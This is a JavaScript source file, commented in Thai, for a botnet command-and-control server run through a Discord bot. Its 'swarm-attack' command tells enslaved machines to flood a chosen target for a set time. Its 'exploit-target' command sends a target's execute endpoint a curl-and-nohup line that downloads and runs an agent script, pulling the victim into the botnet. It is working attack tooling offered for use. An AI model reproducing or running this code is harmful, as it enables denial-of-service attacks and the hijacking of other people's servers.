const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const axios = require('axios');
const express = require('express');

const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;
let slaveNodes = [];

// HTTP Endpoint สำหรับให้เครื่องทาสรายงานตัวและรับคำสั่ง
app.post('/poll', (req, res) => {
    const { id } = req.body;
    if (id && !slaveNodes.some(node => node.id === id)) {
        slaveNodes.push({ id, ip: req.ip, lastSeen: Date.now() });
        console.log(`[+] เครื่องทาสรายงานตัวเข้ามาใหม่: ${id} (IP: ${req.ip})`);
    }
    // ส่งคำสั่งปัจจุบันกลับไปให้เครื่องทาส
    res.json({ command: global.currentAttackCommand || null });
});

app.get('/', (req, res) => {
    res.send('JARVIS C2 Server is running smoothly.');
});

app.listen(PORT, () => {
    console.log(`[+] C2 HTTP Server running on port ${PORT}`);
});

// Discord Bot Setup
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once('ready', async () => {
    console.log(`[+] C2 Discord Bot logged in as ${client.user.tag}`);
    
    const commands = [
        new SlashCommandBuilder()
            .setName('swarm-attack')
            .setDescription('สั่งการกองทัพเครื่องทาสทั้งหมดรุมยิงเป้าหมายพร้อมกัน!')
            .addStringOption(option =>
                option.setName('target')
                    .setDescription('URL หรือ IP เป้าหมายที่ต้องการถล่ม')
                    .setRequired(true))
            .addIntegerOption(option =>
                option.setName('duration')
                    .setDescription('ระยะเวลาในการยิง (วินาที)')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('nodes-status')
            .setDescription('ตรวจสอบจำนวนกองทัพเครื่องทาสที่ออนไลน์อยู่ตอนนี้'),
        new SlashCommandBuilder()
            .setName('exploit-target')
            .setDescription('ส่งคำสั่งเจาะช่องโหว่เป้าหมายเพื่อเพิ่มเครื่องทาสเข้ากองทัพ')
            .addStringOption(option =>
                option.setName('target-url')
                    .setDescription('URL เป้าหมายที่มีช่องโหว่')
                    .setRequired(true))
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands },
        );
        console.log('[+] C2 Slash commands registered successfully.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'nodes-status') {
        return interaction.reply({ content: `[📊] สถานะกองทัพตอนนี้:\n- จำนวนเครื่องทาสที่เชื่อมต่ออยู่: **${slaveNodes.length} เครื่อง**`, ephemeral: true });
    }

    if (interaction.commandName === 'swarm-attack') {
        const target = interaction.options.getString('target');
        const duration = interaction.options.getInteger('duration');

        if (slaveNodes.length === 0) {
            return interaction.reply({ content: '[-] ไม่มีเครื่องทาสในกองทัพ! ไปหาเหยื่อมาก่อนไอ้น้อง!', ephemeral: true });
        }

        // ตั้งค่าคำสั่งโจมตีเพื่อให้เครื่องทาสดึงไปรัน
        global.currentAttackCommand = {
            id: Math.random().toString(36).substring(7),
            action: 'attack',
            target: target,
            duration: duration
        };

        await interaction.reply(`[🔥⚡] ส่งสัญญาณคำสั่งไปยังกองทัพ ${slaveNodes.length} เครื่อง เพื่อรุมถล่ม ${target} เป็นเวลา ${duration} วินาทีแล้ว!`);

        // ล้างคำสั่งหลังหมดเวลา
        setTimeout(() => {
            global.currentAttackCommand = null;
        }, duration * 1000);
    }

    if (interaction.commandName === 'exploit-target') {
        let targetUrl = interaction.options.getString('target-url');
        await interaction.reply(`[!] กำลังส่งโค้ดเจาะช่องโหว่ใส่เป้าหมาย ${targetUrl} เพื่อดึงเข้ากองทัพ...`);

        try {
            const vulnerabilityEndpoint = `${targetUrl}/api/v1/execute`;
            // ดึง Domain ของตัวเองจาก Railway มาใช้ให้อัตโนมัติ
            const railwayDomain = process.env.RAILWAY_STATIC_URL || `http://localhost:${PORT}`;
            const payloadCommand = `cd /tmp && curl -O ${railwayDomain}/agent.js && nohup node agent.js > /dev/null 2>&1 &`;

            const response = await axios.post(vulnerabilityEndpoint, { command: payloadCommand }, { timeout: 4000 });

            if (response.status === 200) {
                await interaction.followUp(`[+] สำเร็จ! เจาะและส่ง Payload ไปยัง ${targetUrl} เรียบร้อย!`);
            } else {
                await interaction.followUp(`[-] เป้าหมาย ${targetUrl} ป้องกันแน่นหนา เจาะไม่เข้า!`);
            }
        } catch (err) {
            await interaction.followUp(`[-] เกิดข้อผิดพลาดในการเจาะเป้าหมาย ${targetUrl}: ${err.message}`);
        }
    }
});

client.login(process.env.DISCORD_TOKEN);